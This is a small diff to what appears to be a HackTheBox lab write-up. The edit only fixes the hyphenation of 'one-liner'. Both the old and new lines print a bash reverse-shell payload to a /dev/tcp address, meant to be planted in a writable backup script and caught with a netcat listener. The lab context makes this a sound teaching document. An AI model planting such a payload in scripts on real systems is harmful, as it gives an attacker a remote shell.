@@ -83,7 +83,7 @@ htb-student@NIX02:~$ cat /dmz-backups/backup.sh
  htb-student@NIX02:~$ nano /dmz-backups/backup.sh
 ```
 
-Insert one liner payload `bash -i >& /dev/tcp/10.10.15.45/443 0>&1` and save.
+Insert one-liner payload `bash -i >& /dev/tcp/10.10.15.45/443 0>&1` and save.
 
 Then setup `netcat` to listen for the incoming connection.
 
